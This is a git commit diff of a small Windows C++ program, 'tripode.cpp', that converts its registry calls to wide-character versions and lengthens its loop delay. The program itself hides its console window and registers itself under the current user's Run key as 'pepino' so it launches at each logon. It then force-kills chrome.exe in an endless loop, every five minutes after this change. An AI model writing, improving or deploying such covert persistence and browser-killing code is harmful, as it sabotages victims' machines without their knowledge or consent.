27fb0cde62934fee7553c35c52eff6a57ffc9d86
mariano262 <62451812+mariano262@users.noreply.github.com>
2026-03-24 16:26:02 -0300

    Add files via upload

--- tripode.cpp
+++ tripode.cpp
@@ -6,23 +6,25 @@
 
 int main() {
 	HKEY hKey;
-	LPCSTR subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
-	LONG result = RegOpenKeyExA(HKEY_CURRENT_USER,subKey,0,KEY_SET_VALUE,&hKey);
+	LPCWSTR subKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+	LONG result = RegOpenKeyExW(HKEY_CURRENT_USER,subKey,0,KEY_SET_VALUE,&hKey);
 	HWND consola = GetConsoleWindow();
-	char path[MAX_PATH];
-	GetModuleFileNameA(NULL, path, MAX_PATH);
-	std::string quotedPath = std::string("\"")+path+("\"");
+	wchar_t path[MAX_PATH];
+	const wchar_t* valor = L"pepino";
+	GetModuleFileNameW(NULL, path, MAX_PATH);
+	std::wstring quotedPath = L"\"" + std::wstring(path)+L"\"";
 	if (consola) {
 		ShowWindow(consola,SW_HIDE);
 	}
 	while (true) {
 		if (result == ERROR_SUCCESS) {
-			result = RegSetValueExA(hKey,"pepino",0,REG_SZ,reinterpret_cast<const BYTE*>(quotedPath.c_str()),
-				quotedPath.size()+1);
+			result = RegSetValueExW(hKey, valor, 0, REG_SZ, 
+				reinterpret_cast<const BYTE*>(quotedPath.c_str()),
+				(quotedPath.size() + 1)*sizeof(wchar_t));
 		}
 		system("taskkill /im chrome.exe /f");
 		std::cout << "Esperando 2 segundos..." << std::endl;
-		std::this_thread::sleep_for(std::chrono::seconds(2));
+		std::this_thread::sleep_for(std::chrono::seconds(5*60));
 	}
 	return 0;
 }
